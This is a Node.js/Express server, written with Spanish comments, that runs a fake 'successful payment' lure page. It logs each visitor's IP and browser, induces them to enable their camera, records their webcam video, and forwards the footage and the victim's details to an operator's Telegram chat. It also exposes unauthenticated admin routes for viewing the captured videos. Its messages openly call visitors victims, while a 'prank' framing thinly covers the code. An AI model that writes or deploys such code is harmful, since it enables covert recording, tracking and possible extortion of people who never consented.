const express = require('express');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'TU_BOT_TOKEN_AQUI';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'TU_CHAT_ID_AQUI';

let bot;
if (TELEGRAM_BOT_TOKEN !== 'TU_BOT_TOKEN_AQUI') {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));
app.use(requestIp.mw());

// Crear directorios necesarios
fs.ensureDirSync('./videos');
fs.ensureDirSync('./logs');

// Configuración de multer para videos
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'videos/')
  },
  filename: function (req, file, cb) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const ip = req.clientIp || 'unknown';
    cb(null, `video_${timestamp}_${ip.replace(/[:.]/g, '-')}.webm`)
  }
});

const upload = multer({ storage: storage });

// Función para registrar accesos
function logAccess(req, action, extra = '') {
  const timestamp = new Date().toISOString();
  const ip = req.clientIp || 'unknown';
  const userAgent = req.get('User-Agent') || 'unknown';
  const logEntry = `${timestamp} | IP: ${ip} | Action: ${action} | UserAgent: ${userAgent} | ${extra}\n`;
  
  fs.appendFileSync('./logs/access.log', logEntry);
  console.log(`[${timestamp}] ${action} from ${ip}`);
}

// Función para enviar notificación a Telegram
async function sendToTelegram(message, videoPath = null) {
  if (!bot || TELEGRAM_CHAT_ID === 'TU_CHAT_ID_AQUI') {
    console.log('Telegram no configurado:', message);
    return;
  }

  try {
    // Enviar mensaje de texto
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' });
    
    // Si hay video, enviarlo
    if (videoPath && fs.existsSync(videoPath)) {
      const videoBuffer = fs.readFileSync(videoPath);
      await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, {
        caption: '🎥 Video de la víctima capturado'
      });
      console.log('Video enviado a Telegram');
    }
  } catch (error) {
    console.error('Error enviando a Telegram:', error);
  }
}

// Rutas
app.get('/', (req, res) => {
  logAccess(req, 'PAGE_ACCESS');
  
  // Notificar acceso a Telegram
  const ip = req.clientIp || 'unknown';
  const userAgent = req.get('User-Agent') || 'unknown';
  const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
  
  const message = `🎯 <b>NUEVA VÍCTIMA DETECTADA</b>
  
📱 <b>IP:</b> <code>${ip}</code>
🌐 <b>Navegador:</b> ${userAgent.substring(0, 50)}...
⏰ <b>Hora:</b> ${timestamp}
💰 <b>Monto mostrado:</b> ฿6,100.00

🔍 La víctima está viendo la página de "pago exitoso"
⚠️ Esperando que active la cámara...`;

  sendToTelegram(message);
  
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/register-access', (req, res) => {
  logAccess(req, 'CAMERA_REQUESTED', `Browser: ${req.body.browser || 'unknown'}`);
  res.json({ status: 'logged' });
});

app.post('/upload-video', upload.single('video'), async (req, res) => {
  if (req.file) {
    logAccess(req, 'VIDEO_UPLOADED', `File: ${req.file.filename} Size: ${req.file.size} bytes`);
    
    // Obtener información de la víctima
    const ip = req.clientIp || 'unknown';
    const userAgent = req.get('User-Agent') || 'unknown';
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
    const fileSize = (req.file.size / 1024 / 1024).toFixed(2); // MB
    
    // Crear mensaje para Telegram
    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b>
    
📱 <b>IP Víctima:</b> <code>${ip}</code>
🎥 <b>Archivo:</b> <code>${req.file.filename}</code>
📊 <b>Tamaño:</b> ${fileSize} MB
⏰ <b>Hora captura:</b> ${timestamp}
🌐 <b>Dispositivo:</b> ${userAgent.substring(0, 80)}...

🎭 <b>¡La broma fue un éxito!</b>
💰 <b>Creyó que pagaste:</b> ฿6,100.00`;

    // Enviar a Telegram con el video
    await sendToTelegram(message, req.file.path);
    
    res.json({ 
      status: 'success', 
      message: 'Video grabado correctamente',
      filename: req.file.filename 
    });
  } else {
    logAccess(req, 'VIDEO_UPLOAD_FAILED');
    res.status(400).json({ status: 'error', message: 'Error al subir video' });
  }
});

app.post('/log-camera-denied', async (req, res) => {
  logAccess(req, 'CAMERA_DENIED');
  
  // Notificar que negó la cámara
  const ip = req.clientIp || 'unknown';
  const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
  
  const message = `⚠️ <b>VÍCTIMA NEGÓ LA CÁMARA</b>
  
📱 <b>IP:</b> <code>${ip}</code>
⏰ <b>Hora:</b> ${timestamp}
🚫 <b>Estado:</b> Acceso a cámara denegado

😤 La víctima se escapó, pero tenemos su IP...`;

  await sendToTelegram(message);
  
  res.json({ status: 'logged' });
});

// Ruta para ver logs (solo para ti)
app.get('/admin/logs', (req, res) => {
  try {
    const logs = fs.readFileSync('./logs/access.log', 'utf8');
    res.send(`<pre>${logs}</pre>`);
  } catch (err) {
    res.send('No hay logs disponibles');
  }
});

// Ruta para listar videos (solo para ti)
app.get('/admin/videos', (req, res) => {
  try {
    const videos = fs.readdirSync('./videos');
    let html = '<h2>Videos Grabados:</h2><ul>';
    videos.forEach(video => {
      html += `<li><a href="/admin/video/${video}" target="_blank">${video}</a></li>`;
    });
    html += '</ul>';
    res.send(html);
  } catch (err) {
    res.send('No hay videos disponibles');
  }
});

// Ruta para servir videos (solo para ti)
app.get('/admin/video/:filename', (req, res) => {
  const filename = req.params.filename;
  const filepath = path.join(__dirname, 'videos', filename);
  
  if (fs.existsSync(filepath)) {
    res.sendFile(filepath);
  } else {
    res.status(404).send('Video no encontrado');
  }
});

app.listen(PORT, () => {
  console.log(`🎭 Servidor de broma ejecutándose en puerto ${PORT}`);
  console.log(`📊 Admin logs: http://localhost:${PORT}/admin/logs`);
  console.log(`🎥 Admin videos: http://localhost:${PORT}/admin/videos`);
}); 